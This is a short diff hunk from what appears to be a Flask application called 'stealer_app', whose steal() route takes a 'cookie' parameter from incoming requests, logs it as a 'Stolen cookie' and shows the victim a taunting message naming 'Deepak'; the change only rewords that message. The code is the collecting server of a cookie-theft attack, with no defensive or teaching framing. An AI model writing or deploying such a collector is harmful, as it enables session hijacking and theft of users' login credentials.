@@ -6,7 +6,7 @@ stealer_app = Flask(__name__)
 def steal():  
     cookie = request.args.get('cookie')  
     print(f'Stolen cookie: {cookie}')  
-    message = f'Hahahahahaha Deepak has your: session_token={cookie}'  
+    message = f'Hahahahahaha Deepak has your Cookie and I know ={cookie}'  
     return render_template('index.html', message=message)  
   
 if __name__ == "__main__":  
